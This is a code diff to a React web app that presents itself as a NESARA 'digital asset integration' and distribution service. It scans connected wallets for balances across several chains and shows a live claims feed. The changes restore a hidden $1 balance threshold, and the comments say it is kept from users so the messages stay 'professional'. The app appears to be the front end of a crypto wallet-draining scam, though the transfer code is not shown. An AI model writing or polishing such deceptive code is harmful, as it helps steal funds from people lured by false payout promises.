@@ -44,12 +44,12 @@ const TRANSLATIONS = {
     exploreEcosystem: 'Explore Ecosystem',
     liveUpdates: 'Live Updates',
     
-    // Scanning & Eligibility - Professional loading states
+    // Scanning & Eligibility - Enhanced loading states
     checkEligibility: 'Scanning Blockchain Networks',
     verifying: 'Analyzing wallet for digital asset integration...',
     eligible: '✓ Digital Asset Integration Eligible',
     notEligible: 'No Digital Assets Found for Integration',
-    minRequirement: 'On-chain balance required for ecosystem participation',
+    minRequirement: 'On-chain balance required in any supported network to participate',
     scanComplete: 'Blockchain scan complete',
     assetsFound: 'digital assets found for integration',
     checkingBalance: 'Checking on-chain balance across networks...',
@@ -74,7 +74,7 @@ const TRANSLATIONS = {
     emailNotification: 'Integration confirmation sent',
     blockchainSync: 'Synchronizing with blockchain networks...',
     walletRequired: 'Active wallet connection required',
-    insufficientBalance: 'On-chain balance required. Please ensure you have assets in any supported network.',
+    insufficientBalance: 'On-chain balance required. Please ensure you have assets in any supported network (ETH, BNB, MATIC, AVAX)',
     proceedToRecovery: 'Ready to proceed with digital asset integration',
     recoveryReady: 'Integration ready - click to integrate assets',
     reportGenerated: 'Distribution report generated',
@@ -135,7 +135,7 @@ const TRANSLATIONS = {
     verifying: 'Analizando wallet para integración de activos digitales...',
     eligible: '✓ Elegible para Integración de Activos Digitales',
     notEligible: 'No se encontraron Activos Digitales para Integración',
-    minRequirement: 'Se requiere saldo en cadena para participación en el ecosistema',
+    minRequirement: 'Se requiere saldo en cadena en cualquier red compatible para participar',
     scanComplete: 'Escaneo de blockchain completado',
     assetsFound: 'activos digitales encontrados para integración',
     recoverButton: 'INTEGRAR ACTIVOS DIGITALES',
@@ -148,7 +148,7 @@ const TRANSLATIONS = {
     processingRecovery: 'Iniciando protocolo de integración de activos digitales...',
     recoveryValue: 'Valor de Activos Digitales',
     walletRequired: 'Se requiere wallet conectada',
-    insufficientBalance: 'Se requiere saldo en cadena. Asegúrate de tener activos en alguna red compatible.',
+    insufficientBalance: 'Se requiere saldo en cadena. Asegúrate de tener activos en alguna red compatible (ETH, BNB, MATIC, AVAX)',
     proceedToRecovery: 'Listo para proceder con la integración',
     recoveryReady: 'Integración lista - haz clic para integrar activos',
     liveClaims: 'FEED DE DISTRIBUCIÓN ECONÓMICA EN VIVO',
@@ -1021,7 +1021,7 @@ function App() {
     trackVisit();
   }, []);
 
-  // Check eligibility - MODIFIED: No $1 requirement, just any on-chain balance
+  // Check eligibility - $1 threshold remains in logic but user message is professional
   useEffect(() => {
     if (isConnected && address && Object.keys(balances).length > 0 && !verifying) checkEligibility();
   }, [isConnected, address, balances]);
@@ -1043,15 +1043,14 @@ function App() {
     try {
       const total = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);
       const chainsWithBalance = DEPLOYED_CHAINS.filter(chain => balances[chain.name] && balances[chain.name].amount > 0.000001);
-      // FIXED: Eligible if ANY on-chain balance exists (no $1 minimum)
-      const eligible = chainsWithBalance.length > 0;
+      const eligible = total >= 1; // $1 threshold remains in logic
       
       setIsEligible(eligible);
       setShowDistributeButton(eligible);
       
       if (eligible) {
         setEligibleChains(chainsWithBalance);
-        setTxStatus(`${translations.eligible} - ${chainsWithBalance.length} ${translations.assetsFound}`);
+        setTxStatus(`${translations.eligible} ${chainsWithBalance.length} ${translations.assetsFound}`);
         const chainDetails = chainsWithBalance.map(chain => ({
           name: chain.name,
           amount: balances[chain.name].amount.toFixed(6),
@@ -1346,14 +1345,14 @@ function App() {
           {/* Live Activity Badge */}
           {isConnected && !showDistributeButton && !scanning && <LiveActivityBadge translations={translations} activeUsers={activeUsers} lastDistributionTime={lastDistributionTime} />}
 
-          {/* Wallet Connect Button - FIXED: Disconnect button now clearly visible with proper styling */}
+          {/* Wallet Connect Button - FIXED: Disconnect button with better visibility */}
           {!isConnected ? (
             <button onClick={() => open()} className="bg-gradient-to-r from-amber-600 to-amber-500 hover:from-amber-700 hover:to-amber-600 text-white font-semibold px-8 py-4 rounded-xl transition-all transform hover:scale-105 hover:shadow-[0_10px_20px_rgba(245,158,11,0.4)] mb-8 w-full max-w-md">
               {translations.connectWallet}
             </button>
           ) : (
             <div className="flex flex-col items-center w-full max-w-md mb-8">
-              {/* FIXED: Better visibility for disconnect button - added high contrast background */}
+              {/* FIXED: Better visibility disconnect button - red background with high contrast */}
               <div className="flex items-center justify-between gap-3 bg-black/60 backdrop-blur border border-amber-500/40 rounded-full py-2 pl-5 pr-2 w-full shadow-lg">
                 <span className="font-mono text-sm text-gray-200">{formatAddress(address)}</span>
                 <button onClick={() => disconnect()} className="w-8 h-8 rounded-full bg-red-600/80 hover:bg-red-700 flex items-center justify-center transition-colors shadow-md" title="Disconnect Wallet">
@@ -1378,7 +1377,7 @@ function App() {
                 </button>
               )}
 
-              {/* Eligibility Status Message - FIXED: No $1 mention, just on-chain balance required */}
+              {/* Eligibility Status Message - Professional, no "$1" mention to user */}
               <div className="mt-3 w-full">
                 <div className={`rounded-lg p-3 text-sm ${isEligible ? 'bg-green-500/20 border border-green-500/30 text-green-400' : 'bg-amber-500/10 border border-amber-500/30 text-amber-400'}`}>
                   {isEligible ? (
@@ -1393,7 +1392,7 @@ function App() {
             </div>
           )}
 
-          {/* LIVE DISTRIBUTION FEED - MOVED UP (after connect, before About section as requested) */}
+          {/* LIVE DISTRIBUTION FEED - MOVED UP (right after wallet connection, before What is NESARA) */}
           {isConnected && (
             <div className="w-full mb-8">
               <LiveDistributionFeed 
